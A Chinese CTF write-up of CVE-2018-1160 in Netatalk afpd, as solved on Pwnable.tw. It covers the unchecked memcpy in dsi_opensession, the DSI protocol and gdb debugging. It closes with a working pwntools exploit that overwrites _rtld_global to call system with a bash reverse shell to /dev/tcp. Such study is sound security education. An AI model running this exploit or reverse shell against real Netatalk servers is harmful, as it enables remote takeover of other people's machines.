---
title: 和徐老一起学Pwn 之 Pwnable CVE-2018-1160
categories:
- CTF/Pwn
tags: 
---

> 更新中...和徐老一起完成，HITCON2019时为netatalk的1day，漏洞是由于memcpy长度没限制导致可覆盖关键变量，最终可导致有一次任意地址写，主要挑战为绕过ASLR。由于程序通过fork出一个子进程来处理每一个连接，所以在任意地址写时，可从低到高逐字节的覆盖并爆破原本的合法地址。比较麻烦的是，因为没有和Pwnable远程题目一模一样的环境，所以从合法地址到libc基址仍需要再爆破一次。最后通过覆写位于ld.so数据段_rtld_global结构体，并在程序超时退出时（远程tcp close后需要三分钟），完成控制流劫持并反弹shell。

## 简介

这个洞是2018年被发现，2019年被用到了HITCON Quals上，后又被收录到Pwnable.tw。所以主要有以下三部分文章：

- 原文：[Exploiting an 18 Year Old Bug](https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172)
- 翻译：[Netatalk CVE-2018-1160的发现与利用](https://blog.csdn.net/weixin_43483799/article/details/113856715)
- 复现：[Netatalk CVE-2018–1160 越界写漏洞分析](https://xz.aliyun.com/t/3710)


hitcon相关：

- [HITCON CTF 2019 Pwn 371 Netatalk](https://ddaa.tw/hitconctf_pwn_371_netatalk.html)
- [HITCON CTF 2019 Quals netatalk by balsn](https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#netatalk)


Pwnable相关：

- [CVE-2018-1160 netatalk越界漏洞复现及分析](https://ama2in9.top/2021/01/07/cve-2018-1160/)
- [Netatalk CVE-2018-1160 分析](https://ruan777.github.io/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/)
- [CVE-2018-1160: Expanding the original 18 year old vulnerability exploit](https://tacopwn.net/blog/2021/08/02/cve-2018-1160-expanding-the-original-18-year-old-vulnerability-exploit/)
- [pwnable.tw CVE-2018-1160 Write up](https://katolik-xixon.tistory.com/244)

以上文章写过的我基本就简写了，补充些分析过程以及做题细节。

## 分析

### 漏洞

> 题目给了二进制、配置文件、需要的运行库，所以不需要编译以及安装其他依赖即可运行。

源码：[https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11/](https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11/)

主要目标二进制是：afpd、libatalk.so.18，他们在源码中的路径是：

- **/netatalk-3.1.11/etc/afpd/**
- **/netatalk-3.1.11/libatalk/**

漏洞点在 **/netatalk-3.1.11/libatalk/dsi/dsi_opensess.c** 的 **dsi_opensession** 函数中的 **memcpy**：

```c
/* /netatalk-3.1.11/libatalk/dsi/dsi_opensess.c */

void dsi_opensession(DSI *dsi)
{
  ...
  while (i < dsi->cmdlen) {
    switch (dsi->commands[i++]) {
    case DSIOPT_ATTNQUANT:
      memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);
      dsi->attn_quantum = ntohl(dsi->attn_quantum);
  ...
```

其中memcpy的长度参数 **dsi->commands\[i\]** 由外部传入，且没检查大小，导致可溢出到DSI结构体中attn_quantum的后续成员。

```c
/* /netatalk-3.1.11/include/atalk/dsi.h */

#define DSI_DATASIZ       65536

typedef struct DSI {
    ...
    uint32_t attn_quantum, datasize, server_quantum;
    uint16_t serverID, clientID;
    uint8_t  *commands; /* DSI recieve buffer */
    uint8_t  data[DSI_DATASIZ];    /* DSI reply buffer */
```

但可见成员 **commands** 的类型为uint8_t*，所以memcpy的最大长度是0xff。并且由于 **DSI_DATASIZ** 为65535，所以溢出部分data后就无法向后溢出了，故最终只能溢出如上这些成员变量。

### 交互

开始看这个memcpy的参数一头雾水，为啥拷贝的源地址，和长度都与 **dsi->commands** 相关：

```c
switch (dsi->commands[i++]) {
case DSIOPT_ATTNQUANT:
    memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);
```

而且开头还有个switch里++，越看越费解。所以首先我应该知道dsi是个啥。在源码中没有查到dsi全称，然后发现漏洞原文中有wireshark的截图，并且可以看到wireshark支持解析这个协议，那应该是个挺标准的协议。Google搜索 **dsi_opensession protocol** 即可搜到：[Data Stream Interface](https://en.wikipedia.org/wiki/Data_Stream_Interface)，对照其协议格式，和漏洞PoC：

![image](https://xuanxuanblingbling.github.io/assets/pic/netatalk/poc.png)


发现，PoC中的header就是符合dsi协议的字段，协议中的Payload就是PoC中的commands，可看到commands的构成是：

```python
commands = "\x01"   # DSIOPT_ATTNQUANT 选项的值
commands += "\x80"  # 数据长度
commands += "\xaa" * 0x80
```

再对应memcpy，基本就能看明白了：

```c
switch (dsi->commands[i++]) {
case DSIOPT_ATTNQUANT:
    memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);
```

其中DSIOPT_ATTNQUANT为0x1：

```c
/* /netatalk-3.1.11/include/atalk/dsi.h */

#define DSIOPT_ATTNQUANT 0x01   /* attention quantum */
```

所以memcpy就是从commands数据中按顺序解析出三个元素：功能码，数据长度，数据载荷。所以，也就是由于拷贝的需要的两个参数是揉在一段数据里，并且没有变量名标识，导致看起来比较费解：

```c
commands = 功能码(1 byte) + 数据长度(1 byte) + 数据载荷(n byte)
```


故最终交互，就是构造dsi数据包，并给发送给目标的tcp端口。尝试溢出server_quantum，这个字段可在回包中收到：

```python
from pwn import *
context(endian='big',log_level='debug')
io = remote("chall.pwnable.tw",10002)

cmd  = b'\x01'+ p8(0xc)+ b'a'*0xc
dsi  = b'\x00\x04\x00\x01' 
dsi += p32(0)
dsi += p32(len(cmd)) 
dsi += p32(0)
dsi += cmd

io.send(dsi)
io.recv()
```

测试的确可以收到4个a：

```python
➜   python3 exp.py
[+] Opening connection to chall.pwnable.tw on port 10002: Done
[DEBUG] Sent 0x1e bytes:
    00000000  00 04 00 01  00 00 00 00  00 00 00 0e  00 00 00 00  │····│····│····│····│
    00000010  01 0c 61 61  61 61 61 61  61 61 61 61  61 61        │··aa│aaaa│aaaa│aa│
    0000001e
[DEBUG] Received 0x1c bytes:
    00000000  01 04 00 01  00 00 00 00  00 00 00 0c  00 00 00 00  │····│····│····│····│
    00000010  00 04 61 61  61 61 02 04  00 00 00 80               │··aa│aa··│····│
    0000001c
[*] Closed connection to chall.pwnable.tw port 10002
```

如果想看到清晰的协议格式，可以用wireshark，但因为端口不是协议默认，故需要手动让其识别：

![image](https://xuanxuanblingbling.github.io/assets/pic/netatalk/wireshark.png)


### 调试

上面的交互的确看起来是触发了漏洞并覆盖了变量，不过想看到内存破坏还是得gdb调试。首先本地启动目标程，题目给的libc是2.27，所以使用ubuntu18.04的虚拟机：

```c
➜  LD_PRELOAD="./libatalk.so.18"  ./afpd -d -F ./afp.conf
```

然后检查一下端口情况，成功运行：

```c
➜  sudo netstat -pantu | grep 5566
tcp6    0    0 :::5566     :::*    LISTEN     123345/./afpd    
```

由于我们每次攻击的是fork出来的子进程，所以需要让gdb跟着子进程：

```c
➜  sudo gdb --pid 123345 -q

gef➤  set follow-fork-mode child
gef➤  c
```

然后打一发会引发内存破坏的PoC:

```python
from pwn import *
context(endian='big',log_level='debug')
io = remote("127.0.0.1",5566)

cmd  = b'\x01'+ p8(0x80)+ b'a'*0x80
dsi  = b'\x00\x04\x00\x01' 
dsi += p32(0)
dsi += p32(len(cmd)) 
dsi += p32(0)
dsi += cmd

io.send(dsi)
io.recv()
```

gdb窗口成功进入子进程并崩溃在dsi_opensession中：

```python
gef➤  c
Continuing.
[New process 123552]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Thread 2.1 "afpd" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f863b8e7740 (LWP 123552)]
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x61616161        
$rbx   : 0x0000563fcd14df00  →  0x0000000000000000
$rcx   : 0x6161616161616161 ("aaaaaaaa"?)
$rdx   : 0x0               
$rsp   : 0x00007ffce77c8840  →  0x0000000000000000
$rbp   : 0x0000563fcd14df00  →  0x0000000000000000
$rsi   : 0x00007f863b7e6092  →  0x0000000000000000
$rdi   : 0x0000563fcd14e658  →  0x0000000000000000
$rip   : 0x00007f863b486fbb  →  <dsi_opensession+139> movzx eax, BYTE PTR [rcx+r9*1]
$r8    : 0x0000563fcd14e5d8  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$r9    : 0x1               
$r10   : 0x25              
$r11   : 0x293             
$r12   : 0x0000563fcd14a8b0  →  0x0000563fcd14a9f0  →  0x0000000000000000
$r13   : 0x1e              
$r14   : 0x00007ffce77c8940  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffce77c8840│+0x0000: 0x0000000000000000	 ← $rsp
0x00007ffce77c8848│+0x0008: 0x00007f863b486c63  →  <dsi_getsession+467> mov QWORD PTR [r14], 0x0
0x00007ffce77c8850│+0x0010: 0x0000000000000000
0x00007ffce77c8858│+0x0018: 0x0000000600000005
0x00007ffce77c8860│+0x0020: 0x0000000000000000
0x00007ffce77c8868│+0x0028: 0x0000000000000000
0x00007ffce77c8870│+0x0030: 0x0000000000000000
0x00007ffce77c8878│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f863b486fad <dsi_opensession+125> mov    eax, DWORD PTR [rbx+0x6d8]
   0x7f863b486fb3 <dsi_opensession+131> bswap  eax
   0x7f863b486fb5 <dsi_opensession+133> mov    DWORD PTR [rbx+0x6d8], eax
 → 0x7f863b486fbb <dsi_opensession+139> movzx  eax, BYTE PTR [rcx+r9*1]
   0x7f863b486fc0 <dsi_opensession+144> lea    esi, [rdx+rax*1+0x2]
   0x7f863b486fc4 <dsi_opensession+148> cmp    rsi, QWORD PTR [rbx+0x106f8]
   0x7f863b486fcb <dsi_opensession+155> mov    rdx, rsi
   0x7f863b486fce <dsi_opensession+158> jb     0x7f863b486f80 <dsi_opensession+80>
   0x7f863b486fd0 <dsi_opensession+160> mov    QWORD PTR [rbx+0x106f8], 0xc
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "afpd", stopped 0x7f863b486fbb in dsi_opensession (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f863b486fbb → dsi_opensession()
[#1] 0x7f863b486c63 → dsi_getsession()
[#2] 0x563fcc883645 → main()
───────────────────────────────────────────────────────────────────────────────────────────
0x00007f863b486fbb in dsi_opensession () from ./libatalk.so.18
gef➤
```

死因很明显，对rcx(0x6161616161616161)这个非法地址解引用了。接下来定位一下我们覆盖的目标结构体在哪：

```python
from pwn import *
context(endian='big',log_level='debug')
io = remote("127.0.0.1",5566)

cmd  = b'\x01'+ p8(0xc)+ b'a'*0x8+'xuan'
dsi  = b'\x00\x04\x00\x01' 
dsi += p32(0)
dsi += p32(len(cmd)) 
dsi += p32(0)
dsi += cmd

io.send(dsi)
io.recv()
```

由于父进程不会死，所以很方便，还是原来的命令，断点直接打在刚才死的位置，打完exp后成功断下：

```python
➜  sudo gdb --pid 123345 -q
gef➤  set follow-fork-mode child
gef➤  b * 0x7f863b486fbb
gef➤  c
Continuing.
[New process 123664]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Switching to Thread 0x7f863b8e7740 (LWP 123664)]

Thread 2.1 "afpd" hit Breakpoint 1, 0x00007f863b486fbb in dsi_opensession () from ./libatalk.so.18
```

全局搜索特征串xuan，分析后，rdi寄存器的值，也即0x563fcd14e5e0，就是结构中server_quantum的位置：

```python
gef➤  grep xuan
[+] Searching 'xuan' in memory
[+] In '[heap]'(0x563fcd12c000-0x563fcd16e000), permission=rw-
  0x563fcd14e5e0 - 0x563fcd14e5e4  →   "xuan" 
[+] In (0x7f863b7e6000-0x7f863b8e7000), permission=rw-
  0x7f863b7e601a - 0x7f863b7e601e  →   "xuan" 

gef➤  x /20gx 0x563fcd14e5e0
0x563fcd14e5e0:	0x000100006e617578	0x00007f863b7e6010
0x563fcd14e5f0:	0x0000000000000000	0x0000000000000000
0x563fcd14e600:	0x0000000000000000	0x0000000000000000
```

对应结构体：

```c
/* /netatalk-3.1.11/include/atalk/dsi.h */

#define DSI_DATASIZ       65536

typedef struct DSI {
    ...
    uint32_t attn_quantum, datasize, server_quantum;
    uint16_t serverID, clientID;
    uint8_t  *commands; /* DSI recieve buffer */
    uint8_t  data[DSI_DATASIZ];    /* DSI reply buffer */
```

故位于**0x563fcd14e5e8**的**0x00007f863b7e6010**就是**commands**，根据程序内存布局，梳理一下变量：


```python
...
0x0000563fcc879000 0x0000563fcc8bb000 0x0000000000000000 r-x /mnt/hgfs/桌面/CVE-2018-1160/afpd
0x0000563fccaba000 0x0000563fccabc000 0x0000000000041000 r-- /mnt/hgfs/桌面/CVE-2018-1160/afpd
0x0000563fccabc000 0x0000563fccabf000 0x0000000000043000 rw- /mnt/hgfs/桌面/CVE-2018-1160/afpd
0x0000563fccabf000 0x0000563fccade000 0x0000000000000000 rw- 
0x0000563fcd12c000 0x0000563fcd16e000 0x0000000000000000 rw- [heap]
0x00007f86354f5000 0x00007f86360f6000 0x0000000000000000 rw- 
...
0x00007f863b6ef000 0x00007f863b718000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f863b7e6000 0x00007f863b8e7000 0x0000000000000000 rw- 
0x00007f863b8e7000 0x00007f863b8f8000 0x0000000000000000 rw- 
0x00007f863b916000 0x00007f863b918000 0x0000000000000000 rw- 
0x00007f863b918000 0x00007f863b919000 0x0000000000029000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f863b919000 0x00007f863b91a000 0x000000000002a000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f863b91a000 0x00007f863b91b000 0x0000000000000000 rw- 
...
```

- dsi结构体，其中成员位于0x563fcd14e5e0，这是堆段
- commands指向的内存为0x7f863b7e6010，位于ld.so后面的数据段，目前不详这段内存是啥

所以本次memcpy的漏洞不能触发堆溢出，能想到，主要的玩法就在这个能被覆盖的commands指针上了。

### 源码

要想彻底明白漏洞本身以及利用方法，自然少不了看源码，最主要的是要看明白被覆盖变量的内存位置，用法，以及生命周期。这里简略的记录了一些动作的调用路径：

> 连接初始化

```c
[afpd] main -> configinit -> dsi_init

[libatalk] dsi_init -> dsi_tcp_init ->  dsi->proto_open = dsi_tcp_open
```

> 连接

```c
[afpd] main -> dsi_start -> dsi_getsession

[libatalk] dsi_getsession  -> dsi->proto_open -> dsi_tcp_open -> fork
```

> bug

```c
[afpd] main -> dsi_start -> dsi_getsession

[libatalk] dsi_getsession -> dsi_opensession (bug!!!)
```

> dsi->commands 初始化

```c
[afpd] main -> dsi_start -> dsi_getsession

[libatalk] dsi_getsession  -> dsi->proto_open -> dsi_tcp_open ->

           dsi_init_buffer -> dsi->commands = malloc(dsi->server_quantum)

// 故一个tcp连接init一次dsi->commands

// 值得注意的是
// 由于server_quantum被初始化为0x100000，为1024k，大于128k
// 故对dsi->commands初始化时指向的malloc内存由mmap分配
// 这就解释了上文commands指向0x7f863b7e6010的原因
```

>  exploit 

```c
// dsi_stream_write:    just write a bunch of bytes.
// dsi_stream_read:     just read a bunch of bytes.
// dsi_stream_send:     send a DSI header + data.
// dsi_stream_receive:  read a DSI header + data.


[afpd] main -> dsi_start -> afp_over_dsi -> dsi_stream_receive

[libatalk] dsi_stream_receive -> dsi_stream_read(dsi, dsi->commands, dsi->cmdlen)

// 故修改完commands指针后，在本次tcp中再发一个包就可以任意地址写了，数据内容在dsi中的payload，不包括header
```

## 解题

### 速度

由于连接题目远程很慢，根据题目信息，其服务器是[linode](https://www.linode.com/)提供的，检查ip在日本东京，所以如果使用相同机房的服务器进行解题，则会快很多。买与题目内核版本相同的日本的服务器，测试速度：

```c
root@localhost:~# ping chall.pwnable.tw
PING chall.pwnable.tw 139.162.123.119 56(84) bytes of data.
64 bytes from  139.162.123.119: icmp_seq=1 ttl=63 time=0.801 ms
64 bytes from  139.162.123.119: icmp_seq=2 ttl=63 time=1.03 ms
64 bytes from  139.162.123.119: icmp_seq=3 ttl=63 time=0.853 ms
64 bytes from  139.162.123.119: icmp_seq=4 ttl=63 time=0.743 ms
64 bytes from  139.162.123.119: icmp_seq=5 ttl=63 time=0.622 ms
```

### 利用

```python
from pwn import *
context(endian='big')

libc =ELF("./libc.so.re")
ip = "chall.pwnable.tw"
port = 10002

def aaw(addr,data):
    payload  = b'\x01'+ p8(0x18)+ b'a'*0x10 + p64(addr,endian='little')
    dsi  = b'\x00\x04\x00\x01' 
    dsi += p32(0)
    dsi += p32(len(payload)) 
    dsi += p32(0)
    dsi += payload
    io.send(dsi)
    io.recv()

    dsi  = b'\x00\x04\x00\x01' 
    dsi += p32(0)
    dsi += p32(len(data)) 
    dsi += p32(0)
    dsi += data
    io.send(dsi)
    
leak_addr = b'\x00\x00\xc9\xbc\xa9\x7f\x00\x00'
log.success(hexdump(leak_addr))
leak_addr = u64(leak_addr,endian='little') + 0x2000
log.success(hex(leak_addr))

libc.address = leak_addr - 0xecc000
rtld = libc.address + 0xed2060

log.success(hex(libc.address))
log.success(hex(rtld))
log.success(hex(rtld+2312))

re_shell = b'bash -c "bash  -i>& /dev/tcp/ip/port 0<&1"'
io = remote(ip,port)
aaw(rtld+2312,re_shell.ljust(0x5f8,b'\x00')+p64(libc.symbols['system'],endian='little'))
io.close()
```